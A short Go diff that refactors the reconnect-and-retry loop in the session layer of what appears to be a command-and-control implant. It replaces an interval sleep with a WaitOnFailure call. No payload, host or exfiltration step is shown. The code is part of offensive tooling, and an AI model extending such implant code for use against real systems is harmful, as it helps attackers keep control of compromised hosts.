@@ -20,7 +20,6 @@ package c2
 
 import (
 	"fmt"
-	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -91,15 +90,12 @@ func (t *C2) StartSession() (err error) {
 			return fmt.Errorf("Invalid C2 address sheme: %s", t.uri.Scheme)
 		}
 
-		// Reattempt if any error was thrown when starting/setting up the session layer
+		// Wait and retry if any error was thrown when starting/setting up the session layer
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[%s] Connection failed: %s", t.Profile.C2.String(), err)
 			// {{end}}
-			t.FailedAttempt()
-
-			// Wait according to intervals
-			time.Sleep(time.Duration(t.Profile.Interval))
+			t.WaitOnFailure()
 			continue
 		}
 
